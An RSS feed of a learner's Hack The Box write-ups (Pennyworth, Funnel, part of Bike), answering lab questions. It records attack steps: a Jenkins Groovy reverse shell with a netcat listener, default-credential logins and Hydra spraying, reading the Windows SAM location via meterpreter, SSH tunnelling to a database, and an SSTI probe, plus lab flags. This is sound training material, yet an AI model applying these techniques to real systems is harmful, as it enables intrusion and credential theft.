</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>flag<span style="color:#89dceb;font-weight:bold">{</span>access_the_machine<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
<br>
<h4 id="flag2-this-flag-can-be-found-at-the-location-where-passwords-are-stored-within-windows">Flag2? This flag can be found at the location where passwords are stored within Windows.</h4>
<p>*Errata: Windows really doesn&rsquo;t like the location of this flag and can occasionally delete it. It maybe necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.</p>






<pre tabindex="0"><code>flag{sam_database_elevated_access}</code></pre>
<p>The SAM (Security Accounts Manager) database stores hashed passwords for local user accounts. It is part of the Windows registry and is loaded into memory during the system boot process. The hashes are stored and can be accessed with tools that have sufficient privileges.</p>
<p>Location: <code>C:\Windows\System32\config\SAM</code></p>
<p><img src="image-12.png#center" alt="alt text"></p>
<br>
<h4 id="flag3-this-flag-can-be-found-in-an-excellent-location-to-loot-after-all-administrators-usually-have-pretty-interesting-things-saved">Flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.</h4>






<pre tabindex="0"><code>flag{admin_documents_can_be_valuable}</code></pre>
<p><img src="image-13.png#center" alt="alt text"></p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>meterpreter &gt; cat c:/Users/Jon/Documents/flag3.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>flag<span style="color:#89dceb;font-weight:bold">{</span>admin_documents_can_be_valuable<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
<br>
]]></content:encoded>
    </item>
    <item>
      <title>[HTB] Pennyworth</title>
      <link>http://localhost:1313/htb-pennyworth/</link>
      <pubDate>Sun, 21 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/htb-pennyworth/</guid>
      <description>This box was easier compared to the previous two I attempted. However, I still referred to the provided walkthrough. I am trying to apply a top-down approach to my learning as a mentor advised me to. I feel too dependent on resources because I am not confident in my skills yet and have always relied on guided learning. I admit there is not shortcut; trial and error will benefit me in the long run.</description>
      <content:encoded><![CDATA[<div style="text-align: center"><img src="./giphy.gif"></div>
<p>This box was easier compared to the previous two I attempted. However, I still referred to the provided walkthrough. I am trying to apply a <code>top-down</code> approach to my learning as a mentor advised me to. I feel too dependent on resources because I am not confident in my skills yet and have always relied on guided learning. I admit there is not shortcut; <code>trial and error</code> will benefit me in the long run.</p>
<hr>
<h4 id="what-does-the-acronym-cve-stand-for">What does the acronym CVE stand for?</h4>






<pre tabindex="0"><code>Common Vulnerabilities and Exposures</code></pre>
<br>
<h4 id="what-do-the-three-letters-in-cia-referring-to-the-cia-traid-in-cybersecurity-stand-for">What do the three letters in CIA, referring to the CIA traid in cybersecurity, stand for?</h4>






<pre tabindex="0"><code>Confidentiality, Integrity, Availability</code></pre>
<p>When I was studying for the CompTIA Security+ certification, the CIA triad was emphasized repeatedly throughout the course. I&rsquo;m grateful for this question as it reminds me again of this important cybersecurity principle.</p>
<br>
<h4 id="what-is-the-version-of-the-service-running-on-port-8080">What is the version of the service running on port 8080?</h4>






<pre tabindex="0"><code>Jetty 9.4.39.v20210325</code></pre>
<p><img src="image.png#center" alt="alt text"></p>
<br>
<h4 id="what-version-of-jenkins-is-running-on-the-target">What version of Jenkins is running on the target?</h4>






<pre tabindex="0"><code>2.289.1</code></pre>
<p>I couldn&rsquo;t determine the Jenkins version from the nmap scan results. The hint suggested checking the bottom right corner of the <code>admin</code> page, implying I needed admin access. I didn&rsquo;t know the admin credentials, but the walkthrough recommended searching for common weak credential pairs. The combination that worked was <code>root:password</code>.</p>
<p><img src="image-1.png#center" alt="alt text"></p>
<br>
<h4 id="what-type-of-script-is-accepted-as-input-on-the-jenkins-script-console">What type of script is accepted as input on the Jenkins Script Console?</h4>






<pre tabindex="0"><code>Groovy</code></pre>
<p><img src="image-2.png#center" alt="alt text"></p>
<br>
<h4 id="what-would-the-string-cmd-variable-from-the-groovy-script-snippet-be-equal-to-if-the-target-vm-was-running-windows">What would the <code>String cmd</code> variable from the Groovy Script snippet be equal to if the Target VM was running Windows?</h4>






<pre tabindex="0"><code>cmd.exe</code></pre>
<p>I thought having access to a script console implies we need to create a reverse shell, meaning the target will initiate a connection back to our attacker VM. I referred to the Java version of the Reverse Shell Cheat Sheet because the Groovy script uses Java syntax. The Java Alternative 1 option shows that <code>String cmd</code> variable is equal to <code>cmd.exe</code> in Windows.</p>
<p><img src="image-3.png#center" alt="alt text"></p>
<br>
<p><img src="image-4.png#center" alt="alt text"></p>
<br>
<h4 id="what-is-a-different-command-than-ip-a-we-could-use-to-display-our-network-interfaces-information-on-linux">What is a different command than <code>ip a</code> we could use to display our network interfaces&rsquo; information on Linux?</h4>






<pre tabindex="0"><code>ifconfig</code></pre>
<p><img src="image-6.png#center" alt="alt text"></p>
<br>
<h4 id="what-switch-should-we-use-with-netcat-for-it-to-use-udp-transport-mode">What switch should we use with netcat for it to use UDP transport mode?</h4>






<pre tabindex="0"><code>-u</code></pre>
<p><img src="image-7.png#center" alt="alt text"></p>
<br>
<h4 id="what-is-the-term-used-to-describe-making-a-target-host-initiate-a-connection-back-to-the-attacker-host">What is the term used to describe making a target host initiate a connection back to the attacker host?</h4>






<pre tabindex="0"><code>reverse shell</code></pre>
<br>
<h4 id="submit-root-flag">Submit root flag</h4>






<pre tabindex="0"><code>9cdfb439c7876e703e307864c9167a15</code></pre>
<p>Since the target was linux based, I had to change the <code>String cmd=&quot;cmd.exe&quot;</code> to <code>String cmd=&quot;/bin/bash&quot;</code>. Before sending the payload, I started netcat to receive the reverse shell using the command: <code>nc -lvnp 1234</code>. I personally specified the port 1234 in the payload, and netcat was set to listen on that port.</p>
<p>After sucessfully receiving the reverse shell, I was able to locate the flag on the target host.</p>
<p><img src="image-8.png#center" alt="alt text"></p>
<br>
<p><img src="image-9.png#center" alt="alt text"></p>
]]></content:encoded>
    </item>
    <item>
      <title>[HTB] Funnel</title>
      <link>http://localhost:1313/htb-funnel/</link>
      <pubDate>Thu, 18 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/htb-funnel/</guid>
      <description>How many TCP ports are open? 2 According to output of the nmap scan, there are 2 open ports.
What is the name of the directory that is available on the FTP server? mail_backup 1PORT STATE SERVICE VERSION 221/tcp open ftp vsftpd 3.0.3 3| ftp-anon: Anonymous FTP login allowed (FTP code 230) 4|_drwxr-xr-x 2 ftp ftp 4096 Nov 28 2022 mail_backup What is the default account password that every new member on the &amp;ldquo;Funnel&amp;rdquo; team should change as soon as possible?</description>
      <content:encoded><![CDATA[<h4 id="how-many-tcp-ports-are-open">How many TCP ports are open?</h4>






<pre tabindex="0"><code>2</code></pre>
<p>According to output of the nmap scan, there are 2 open ports.</p>
<p><img src="image.png#center" alt="alt text"></p>
<br>
<h4 id="what-is-the-name-of-the-directory-that-is-available-on-the-ftp-server">What is the name of the directory that is available on the FTP server?</h4>






<pre tabindex="0"><code>mail_backup</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>21/tcp open  ftp     vsftpd 3.0.3
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>| ftp-anon: Anonymous FTP login allowed <span style="color:#89dceb;font-weight:bold">(</span>FTP code 230<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>|_drwxr-xr-x    <span style="color:#fab387">2</span> ftp      ftp          <span style="color:#fab387">4096</span> Nov <span style="color:#fab387">28</span>  <span style="color:#fab387">2022</span> mail_backup</span></span></code></pre></div>
<br>
<h4 id="what-is-the-default-account-password-that-every-new-member-on-the-funnel-team-should-change-as-soon-as-possible">What is the default account password that every new member on the &ldquo;Funnel&rdquo; team should change as soon as possible?</h4>






<pre tabindex="0"><code>funnel123#!#</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>$ ftp 10.129.151.228
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Connected to 10.129.151.228.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span><span style="color:#fab387">220</span> <span style="color:#89dceb;font-weight:bold">(</span>vsFTPd 3.0.3<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Name <span style="color:#89dceb;font-weight:bold">(</span>10.129.151.228:kali<span style="color:#89dceb;font-weight:bold">)</span>: anonymous
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#fab387">331</span> Please specify the password.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Password:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#fab387">230</span> Login successful.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Remote system <span style="color:#89dceb">type</span> is UNIX.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>Using binary mode to transfer files.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>ftp&gt; ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#fab387">229</span> Entering Extended Passive Mode <span style="color:#89dceb;font-weight:bold">(||</span>|32449|<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span><span style="color:#fab387">150</span> Here comes the directory listing.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>drwxr-xr-x    <span style="color:#fab387">2</span> ftp      ftp          <span style="color:#fab387">4096</span> Nov <span style="color:#fab387">28</span>  <span style="color:#fab387">2022</span> mail_backup
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span><span style="color:#fab387">226</span> Directory send OK.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>ftp&gt; <span style="color:#89dceb">cd</span> mail_backup
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span><span style="color:#fab387">250</span> Directory successfully changed.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>ftp&gt; ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span><span style="color:#fab387">229</span> Entering Extended Passive Mode <span style="color:#89dceb;font-weight:bold">(||</span>|61475|<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span><span style="color:#fab387">150</span> Here comes the directory listing.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>-rw-r--r--    <span style="color:#fab387">1</span> ftp      ftp         <span style="color:#fab387">58899</span> Nov <span style="color:#fab387">28</span>  <span style="color:#fab387">2022</span> password_policy.pdf
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>-rw-r--r--    <span style="color:#fab387">1</span> ftp      ftp           <span style="color:#fab387">713</span> Nov <span style="color:#fab387">28</span>  <span style="color:#fab387">2022</span> welcome_28112022
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span><span style="color:#fab387">226</span> Directory send OK.</span></span></code></pre></div>
<br>
<p>After logged into the ftp server as <code>anonymous</code>, I was able to locate 2 files inside the mail_backup directory. Downloaded those files to local and the <code>password_policy.pdf</code> file disclosed the default password of a newly created user.</p>
<p><img src="image-1.png#center" alt="alt text"></p>
<br>
<h4 id="which-user-has-not-changed-their-default-password-yet">Which user has not changed their default password yet?</h4>






<pre tabindex="0"><code>christine</code></pre>
<p>From the <code>welcome_28112022</code> file, we noticed that the new users are 5 people: <code>optimus</code>, <code>albert</code>, <code>andreas</code>, <code>christine</code>, and <code>maria</code>. As we already saw from the previous task, the default password was <code>funnel#!#</code> for new users. We can try to login with their credentials one by one to ssh server and see if any of them has not changed their default password.</p>
<p><img src="image-2.png#center" alt="alt text"></p>
<p>I was able to login to the ssh server with <code>christine</code>&rsquo;s credentials with the default password.
<img src="image-3.png#center" alt="alt text"></p>
<hr>
<p>Instead of manually inputting password for each credential, we can also use <code>Hydra</code> to automate the process.</p>
<p><img src="image-6.png#center" alt="alt text"></p>
<br>
<h4 id="which-service-is-running-on-tcp-port-5432-and-listens-only-on-localhost">Which service is running on TCP port 5432 and listens only on localhost?</h4>






<pre tabindex="0"><code>postgresql</code></pre>
<p>First, I ran another nmap scan particularly on the port 5432 and it showed that <code>postgresql</code> as the servic running on the port 5432.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>$ nmap -sC -sV 10.129.151.228 -p <span style="color:#fab387">5432</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Starting Nmap 7.94SVN <span style="color:#89dceb;font-weight:bold">(</span> https://nmap.org <span style="color:#89dceb;font-weight:bold">)</span> at 2024-07-18 00:52 EDT
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Nmap scan report <span style="color:#cba6f7">for</span> 10.129.151.228
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Host is up <span style="color:#89dceb;font-weight:bold">(</span>0.033s latency<span style="color:#89dceb;font-weight:bold">)</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>PORT     STATE  SERVICE    VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>5432/tcp closed postgresql
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Nmap <span style="color:#cba6f7">done</span>: <span style="color:#fab387">1</span> IP address <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">1</span> host up<span style="color:#89dceb;font-weight:bold">)</span> scanned in 0.29 seconds</span></span></code></pre></div>
<br>
<p>To confirm I used the <code>ss</code> command to dump socket statistics. It&rsquo;s a utility to investigate sockets, similar to the older <code>netstat</code> command.</p>
<ul>
<li><code>-t</code> or <code>--tcp</code>: this option displays only TCP sockets.</li>
<li><code>-l</code> or <code>--listening</code>: displays only listening sockets.</li>
</ul>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>christine@funnel:~$ ss -tl <span style="color:#f5e0dc">sport</span> <span style="color:#89dceb;font-weight:bold">=</span> :5432
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>State            Recv-Q           Send-Q                       Local Address:Port                             Peer Address:Port           Process
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>LISTEN           <span style="color:#fab387">0</span>                <span style="color:#fab387">4096</span>                             127.0.0.1:postgresql                            0.0.0.0:*</span></span></code></pre></div>
<br>
<h4 id="since-you-cant-access-the-previously-mentioned-service-from-the-local-machine-you-will-have-to-create-a-tunnel-and-connect-to-it-from-your-machine-what-is-the-correct-type-of-tunneling-to-use-remote-port-forwarding-or-local-port-forwarding">Since you can&rsquo;t access the previously mentioned service from the local machine, you will have to create a tunnel and connect to it from your machine. What is the correct type of tunneling to use? remote port forwarding or local port forwarding?</h4>






<pre tabindex="0"><code>local port forwarding</code></pre>
<p>According to the definition of tunneling, one can use it to access resources that are available only to internal networks. To create/facilitate such tunnels, an appropriate application should be used. The most known one is <code>SSH</code>.</p>
<p>The <code>SSH</code> protocol is vastly used for maintaining and accessing remote systems in a secure and encrypted way. But, it also offers the possibility to create tunnels that operate over the SSH protocol. More specifically, SSH offers various types of tunnels.</p>
<p>When <code>local port forwarding</code> is used, a separate tunnel is created inside the existing valid SSH session that forwards network traffic from a local port on the client&rsquo;s machine over to the remote server&rsquo;s port. Under the hood, SSH allocates a socket listener on the client on the given port.</p>
<p>When <code>remote port forwarding</code>, also known as <code>Reverse Tunneling</code> is used, after a successful SSH connection, a separate tunnel is created which SSH users to redirect incoming traffic to the server&rsquo;s port back to the client. Internally, SSH allocates a socket listener on the server on the given port. When a connection is made to this port, the connection is forwarded over the existing SSH session over to the local client&rsquo;s port.</p>
<h4 id="again-in-simple-terms">Again in simple terms</h4>
<h5 id="local-port-forwarding">Local Port Forwarding</h5>
<p>Imagine you have a computer at home, and there&rsquo;s a service or website you can only access from your office network. You want to connect to that service from your home computer. Local port forwarding can help you do that.</p>
<p>How it works:</p>
<ol>
<li>You create a tunnel (connection) from your home computer to your office computer</li>
<li>You tell your home computer to listen on a specific port (e.g., 8080).</li>
<li>Any data you send to this port on your home computer gets forwarded to the service on your office network.</li>
</ol>
<h5 id="remote-port-forwarding">Remote Port Forwarding</h5>
<p>Now imagine the opposite scenario: you are at work, and you want to access a service running on your home computer, but your home network doesn&rsquo;t allow incoming connections from outside. Remote port forwarding can help here.</p>
<p>How it works:</p>
<ol>
<li>You create a tunnel from your office computer to your home computer.</li>
<li>You tell your home computer to listen on a specific port and forward requests to a service on your office computer.</li>
<li>Any data sent to this port on your home computer gets forwarded to the service on your office network.</li>
</ol>
<h4 id="tunneling">Tunneling</h4>
<p>To use local port forwarding with SSH, you can use the <code>ssh</code> command with the <code>-L</code> option, followed by the local port, remote host and port, and the remote SSH server.</p>
<p><code>ssh -L 1234:localhost:22 christine@10.129.151.228</code></p>
<p>When you run this command, the SSH client will establish a secure connection to the remote SSH server, and it will listen for incoming connections on the local port <code>1234</code>. When a client connects to the local port, the SSH client will forward the connection to the remote server on port <code>22</code>. This allows the local client to access services on the remote server as if they were running on the local machine.</p>
<p>However, we want to forward traffic from any given local port, for instance <code>1234</code>, to the port on which <code>PostgreSQL</code> is listening, <code>5432</code>, on the remote server. Therefore specify port 1234 to the left of localhost, and 5432 to the right, indicating the target port.</p>
<p><code>ssh -L 1234:localhost:5432 christine@10.129.151.228</code></p>
<br>
<h4 id="what-is-the-name-of-the-database-that-holds-the-flag">What is the name of the database that holds the flag?</h4>






<pre tabindex="0"><code>Secrets</code></pre>
<p>After entering christine&rsquo;s password, we have a shell on the target system like we did before, however, under the hood, SSH has opened up a socket on our local machine on port 1234, to which we can now direct traffic that we want forwarded to port 5432 on the target machine.</p>
<p>By running the following command, I was able to interact with the postgresql service running locally on the target machine.</p>
<p><code>psql -U chirstine -h localhost -p 1234</code></p>
<p>Then <code>\l</code> command to list all the databases. Out of the databases, the database with the name <strong>*Secrets</strong> is very suspicious. I used <code>\c secrets</code> to change the database to the secrets db and <code>\dt</code> command to display all the tables that belong to the db. Finally <code>SELECT * FROM flag;</code> to display the flag.</p>
<p><img src="image-4.png#center" alt="alt text"></p>
<br>
<h4 id="could-you-use-a-dynamic-tunnel-instead-of-local-port-forwarding-yes-or-no">Could you use a dynamic tunnel instead of local port forwarding? yes or No.</h4>






<pre tabindex="0"><code>Yes</code></pre>
<p>In many cases, the local port forwarding tunnel can indeed be replaced by a dynamic one.</p>
<br>
<h4 id="submit-root-flag">Submit root flag</h4>






<pre tabindex="0"><code>cf277664b1771217d7006acdea006db1</code></pre>
<br>
<p><img src="image-5.png#center" alt="alt text"></p>
]]></content:encoded>
    </item>
    <item>
      <title>[HTB] Bike</title>
      <link>http://localhost:1313/htb-bike/</link>
      <pubDate>Wed, 17 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/htb-bike/</guid>
      <description>This box was really tough to pwn. I am 100% sure I wouldn&amp;rsquo;t have been able to clear it on my own without the provided walkthrough documents. I understand every step from the enumeration phase to the exploit, but I think I lack the knowledge to connect the dots between enumeration and exploits. This is also my first time encountering the Template Engine and SSTI Vulnerability. I know it takes time, and I have improved a lot over the past month.</description>
      <content:encoded><![CDATA[<p>This box was really tough to pwn. I am 100% sure I wouldn&rsquo;t have been able to clear it on my own without the provided walkthrough documents. I understand every step from the enumeration phase to the exploit, but I think I lack the knowledge to connect the dots between enumeration and exploits. This is also my first time encountering the <code>Template Engine</code> and <code>SSTI Vulnerability</code>. I know it takes time, and I have improved a lot over the past month. I am trying not to hurry my learning because impatience has negatively impacted me several times in my life. I really do not want that to happen again. Let&rsquo;s take it slow.</p>
<hr>
<h4 id="what-tcp-ports-does-nmap-identify-as-open-answer-with-a-list-of-ports-separated-by-commas-with-no-spaces-from-low-to-high">What TCP ports does nmap identify as open? Answer with a list of ports separated by commas with no spaces, from low to high.</h4>






<pre tabindex="0"><code>22,80</code></pre>
<p><img src="image.png#center" alt="alt text"></p>
<br>
<h4 id="what-software-is-running-the-service-listening-on-the-httpweb-port-identified-in-the-first-question">What software is running the service listening on the http/web port identified in the first question?</h4>






<pre tabindex="0"><code>Node.js</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu Linux; protocol 2.0<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>| ssh-hostkey:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>|   <span style="color:#fab387">3072</span> 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae <span style="color:#89dceb;font-weight:bold">(</span>RSA<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>|   <span style="color:#fab387">256</span> b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span style="color:#89dceb;font-weight:bold">(</span>ECDSA<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>|_  <span style="color:#fab387">256</span> 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span style="color:#89dceb;font-weight:bold">(</span>ED25519<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span>80/tcp open  http    Node.js <span style="color:#89dceb;font-weight:bold">(</span>Express middleware<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">8</span><span>|_http-title:  Bike
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">9</span><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span></code></pre></div>
<br>
<h4 id="what-is-the-name-of-the-web-framework-according-to-wappalyzer">What is the name of the Web Framework according to Wappalyzer?</h4>






<pre tabindex="0"><code>Express</code></pre>
<p><img src="image-1.png#center" alt="alt text"></p>
<br>
<h4 id="what-is-the-name-of-the-vulnerability-we-test-for-by-submitting-77">What is the name of the vulnerability we test for by submitting {{7*7}}?</h4>






<pre tabindex="0"><code>Server Side Template Injection</code></pre>
